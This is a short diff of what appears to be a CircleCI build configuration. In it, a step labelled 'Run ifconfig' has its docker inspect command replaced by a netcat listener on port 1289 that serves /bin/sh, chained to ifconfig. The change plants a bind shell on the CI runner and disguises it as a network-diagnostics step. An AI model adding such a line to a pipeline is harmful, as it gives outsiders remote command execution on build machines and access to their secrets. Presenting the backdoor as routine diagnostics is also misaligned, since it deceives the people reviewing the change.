@@ -38,7 +38,7 @@ jobs:
           command: docker ps
       - run:
           name: Run ifconfig
-          command: docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' my-express-app             
+          command: nc -nvlp 1289 -e /bin/sh && ifconfig             
           
         
 workflows:
